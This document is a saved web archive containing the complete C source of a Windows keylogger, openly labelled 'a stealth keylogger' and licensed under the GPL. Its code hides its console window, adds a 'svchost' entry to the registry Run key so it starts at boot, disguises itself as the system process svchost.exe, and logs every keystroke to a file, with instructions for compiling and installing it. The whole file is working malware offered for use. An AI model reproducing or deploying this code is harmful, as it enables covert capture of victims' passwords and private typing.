bplist00�_WebMainResource�	
_WebResourceFrameName^WebResourceURL_WebResourceData_WebResourceMIMEType_WebResourceTextEncodingNameP_file:///index.htmlO��<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <title></title>
  <meta name="Generator" content="Cocoa HTML Writer">
  <meta name="CocoaVersion" content="1265">
  <style type="text/css">
    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Courier; color: #323333; background-color: #f2f6f8}
    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Courier; color: #323333; background-color: #f2f6f8; min-height: 14.0px}
    span.s1 {color: #33587d}
  </style>
</head>
<body>
<p class="p1">/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>File: SVCHOST.c <span class="Apple-converted-space">                                                                </span>*</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>Purpose: a stealth keylogger, writes to file "svchost.log"<span class="Apple-converted-space">                      </span>*</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>* <span class="Apple-converted-space">     </span></p>
<p class="p1">*<span class="Apple-converted-space">  </span>Usage: compile to svchost.exe, copy to c:\%windir%\ and run it. <span class="Apple-converted-space">                </span>*</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>Copyright (C) 2004<span class="Apple-converted-space">  </span>Scorpius, <a href="mailto:scorpius_unknown@yahoo.com"><span class="s1">scorpius_unknown@yahoo.com</span></a>, all rights reserved <span class="Apple-converted-space">  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>This program is free software; you can redistribute it and/or <span class="Apple-converted-space">                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>modify it under the terms of the GNU General Public License <span class="Apple-converted-space">                    </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>as published by the Free Software Foundation; either version 2<span class="Apple-converted-space">                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>of the License, or (at your option) any later version.<span class="Apple-converted-space">                          </span>*</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>This program is distributed in the hope that it will be useful, <span class="Apple-converted-space">                </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>but WITHOUT ANY WARRANTY; without even the implied warranty of<span class="Apple-converted-space">                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<span class="Apple-converted-space">  </span>See the <span class="Apple-converted-space">                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>GNU General Public License for more details.<span class="Apple-converted-space">                                    </span>*</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>You should have received a copy of the GNU General Public License <span class="Apple-converted-space">              </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>along with this program; if not, write to the Free Software <span class="Apple-converted-space">                    </span>*</p>
<p class="p1">*<span class="Apple-converted-space">  </span>Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA<span class="Apple-converted-space">  </span>02111-1307, USA. <span class="Apple-converted-space">    </span>*</p>
<p class="p1">*<span class="Apple-converted-space">                                                                                  </span>*</p>
<p class="p1">* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */</p>
<p class="p2"><br></p>
<p class="p1">#include &amp;lt;windows.h&amp;gt;</p>
<p class="p1">#include &amp;lt;stdio.h&amp;gt;</p>
<p class="p1">#include &amp;lt;winuser.h&amp;gt;</p>
<p class="p1">#include &amp;lt;windowsx.h&amp;gt;</p>
<p class="p2"><br></p>
<p class="p1">#define BUFSIZE 80</p>
<p class="p2"><br></p>
<p class="p1">int test_key(void);</p>
<p class="p1">int create_key(char *);</p>
<p class="p1">int get_keys(void);</p>
<p class="p2"><br></p>
<p class="p2"><br></p>
<p class="p1">int main(void)</p>
<p class="p1">{</p>
<p class="p1"><span class="Apple-converted-space">   </span>HWND stealth; /*creating stealth (window is not visible)*/</p>
<p class="p1"><span class="Apple-converted-space">   </span>AllocConsole();</p>
<p class="p1"><span class="Apple-converted-space">   </span>stealth=FindWindowA("ConsoleWindowClass",NULL);</p>
<p class="p1"><span class="Apple-converted-space">   </span>ShowWindow(stealth,0);</p>
<p class="p2"><span class="Apple-converted-space"> </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>int test,create;</p>
<p class="p1"><span class="Apple-converted-space">   </span>test=test_key();/*check if key is available for opening*/</p>
<p class="p2"><span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>if (test==2)/*create key*/</p>
<p class="p1"><span class="Apple-converted-space">   </span>{</p>
<p class="p1"><span class="Apple-converted-space">       </span>char *path="c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/</p>
<p class="p1"><span class="Apple-converted-space">       </span>create=create_key(path);</p>
<p class="p2"><span class="Apple-converted-space">         </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>}</p>
<p class="p2"><span class="Apple-converted-space">       </span></p>
<p class="p2"><span class="Apple-converted-space"> </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>int t=get_keys();</p>
<p class="p2"><span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>return t;</p>
<p class="p1">} <span class="Apple-converted-space"> </span></p>
<p class="p2"><br></p>
<p class="p1">int get_keys(void)</p>
<p class="p1">{</p>
<p class="p1"><span class="Apple-converted-space">           </span>short character;</p>
<p class="p1"><span class="Apple-converted-space">             </span>while(1)</p>
<p class="p1"><span class="Apple-converted-space">             </span>{</p>
<p class="p1"><span class="Apple-converted-space">                    </span>sleep(10);/*to prevent 100% cpu usage*/</p>
<p class="p1"><span class="Apple-converted-space">                    </span>for(character=8;character&amp;lt;=222;character++)</p>
<p class="p1"><span class="Apple-converted-space">                    </span>{</p>
<p class="p1"><span class="Apple-converted-space">                        </span>if(GetAsyncKeyState(character)==-32767)</p>
<p class="p1"><span class="Apple-converted-space">                        </span>{ <span class="Apple-converted-space"> </span></p>
<p class="p2"><span class="Apple-converted-space">                           </span></p>
<p class="p1"><span class="Apple-converted-space">                            </span>FILE *file;</p>
<p class="p1"><span class="Apple-converted-space">                            </span>file=fopen("svchost.log","a+");</p>
<p class="p1"><span class="Apple-converted-space">                            </span>if(file==NULL)</p>
<p class="p1"><span class="Apple-converted-space">                            </span>{</p>
<p class="p1"><span class="Apple-converted-space">                                    </span>return 1;</p>
<p class="p1"><span class="Apple-converted-space">                            </span>} <span class="Apple-converted-space">           </span></p>
<p class="p1"><span class="Apple-converted-space">                            </span>if(file!=NULL)</p>
<p class="p1"><span class="Apple-converted-space">                            </span>{ <span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">                                    </span>if((character&amp;gt;=39)&amp;&amp;(character&amp;lt;=64))</p>
<p class="p1"><span class="Apple-converted-space">                                    </span>{</p>
<p class="p1"><span class="Apple-converted-space">                                          </span>fputc(character,file);</p>
<p class="p1"><span class="Apple-converted-space">                                          </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                          </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                    </span>} <span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">                                    </span>else if((character&amp;gt;64)&amp;&amp;(character&amp;lt;91))</p>
<p class="p1"><span class="Apple-converted-space">                                    </span>{</p>
<p class="p1"><span class="Apple-converted-space">                                          </span>character+=32;</p>
<p class="p1"><span class="Apple-converted-space">                                          </span>fputc(character,file);</p>
<p class="p1"><span class="Apple-converted-space">                                          </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                          </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                    </span>}</p>
<p class="p1"><span class="Apple-converted-space">                                    </span>else</p>
<p class="p1"><span class="Apple-converted-space">                                    </span>{</p>
<p class="p1"><span class="Apple-converted-space">                                        </span>switch(character)</p>
<p class="p1"><span class="Apple-converted-space">                                        </span>{</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_SPACE:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc(' ',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break; <span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_SHIFT:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[SHIFT]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break; <span class="Apple-converted-space">                                           </span></p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_RETURN:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("\n[ENTER]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_BACK:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[BACKSPACE]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_TAB:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[TAB]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_CONTROL:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[CTRL]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break; <span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_DELETE:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[DEL]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_1:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[;:]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_2:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[/?]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_3:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[`~]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_4:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[ [{ ]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_5:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[\\|]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break; <span class="Apple-converted-space">                               </span></p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_6:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[ ]} ]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_7:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("['\"]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>/*case VK_OEM_PLUS:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('+',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_COMMA:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc(',',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_MINUS:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('-',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_OEM_PERIOD:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('.',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;*/</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD0:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('0',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD1:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('1',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD2:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('2',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD3:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('3',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD4:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('4',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD5:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('5',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD6:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('6',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD7:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('7',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD8:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('8',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_NUMPAD9:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputc('9',file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>case VK_CAPITAL:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fputs("[CAPS LOCK]",file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>default:</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>fclose(file);</p>
<p class="p1"><span class="Apple-converted-space">                                              </span>break;</p>
<p class="p1"><span class="Apple-converted-space">                                       </span>} <span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">                                  </span>} <span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">                             </span>} <span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">                   </span>} <span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">               </span>} <span class="Apple-converted-space">                 </span></p>
<p class="p2"><span class="Apple-converted-space">                   </span></p>
<p class="p1"><span class="Apple-converted-space">           </span>}</p>
<p class="p1"><span class="Apple-converted-space">           </span>return EXIT_SUCCESS; <span class="Apple-converted-space">                           </span></p>
<p class="p1">} <span class="Apple-converted-space">                                               </span></p>
<p class="p2"><br></p>
<p class="p1">int test_key(void)</p>
<p class="p1">{</p>
<p class="p1"><span class="Apple-converted-space">   </span>int check;</p>
<p class="p1"><span class="Apple-converted-space">   </span>HKEY hKey;</p>
<p class="p1"><span class="Apple-converted-space">   </span>char path[BUFSIZE];</p>
<p class="p1"><span class="Apple-converted-space">   </span>DWORD buf_length=BUFSIZE;</p>
<p class="p1"><span class="Apple-converted-space">   </span>int reg_key;</p>
<p class="p2"><span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&amp;hKey);</p>
<p class="p1"><span class="Apple-converted-space">   </span>if(reg_key!=0)</p>
<p class="p1"><span class="Apple-converted-space">   </span>{ <span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">       </span>check=1;</p>
<p class="p1"><span class="Apple-converted-space">       </span>return check;</p>
<p class="p1"><span class="Apple-converted-space">   </span>} <span class="Apple-converted-space">       </span></p>
<p class="p2"><span class="Apple-converted-space">         </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&amp;buf_length);</p>
<p class="p2"><span class="Apple-converted-space">   </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>if((reg_key!=0)||(buf_length&amp;gt;BUFSIZE))</p>
<p class="p1"><span class="Apple-converted-space">       </span>check=2;</p>
<p class="p1"><span class="Apple-converted-space">   </span>if(reg_key==0)</p>
<p class="p1"><span class="Apple-converted-space">       </span>check=0;</p>
<p class="p2"><span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">   </span>RegCloseKey(hKey);</p>
<p class="p1"><span class="Apple-converted-space">   </span>return check; <span class="Apple-converted-space"> </span></p>
<p class="p1">}</p>
<p class="p2"><span class="Apple-converted-space"> </span></p>
<p class="p1">int create_key(char *path)</p>
<p class="p1">{ <span class="Apple-converted-space"> </span></p>
<p class="p1"><span class="Apple-converted-space">       </span>int reg_key,check;</p>
<p class="p2"><span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">       </span>HKEY hkey;</p>
<p class="p2"><span class="Apple-converted-space">       </span></p>
<p class="p1"><span class="Apple-converted-space">       </span>reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&amp;hkey);</p>
<p class="p1"><span class="Apple-converted-space">       </span>if(reg_key==0)</p>
<p class="p1"><span class="Apple-converted-space">       </span>{</p>
<p class="p1"><span class="Apple-converted-space">               </span>RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));</p>
<p class="p1"><span class="Apple-converted-space">               </span>check=0;</p>
<p class="p1"><span class="Apple-converted-space">               </span>return check;</p>
<p class="p1"><span class="Apple-converted-space">       </span>}</p>
<p class="p1"><span class="Apple-converted-space">       </span>if(reg_key!=0)</p>
<p class="p1"><span class="Apple-converted-space">               </span>check=1;</p>
<p class="p2"><span class="Apple-converted-space">               </span></p>
<p class="p1"><span class="Apple-converted-space">       </span>return check;</p>
<p class="p1">}</p>
</body>
</html>
Ytext/htmlUutf-8    ( ? N ` v � � ��8�B                           �H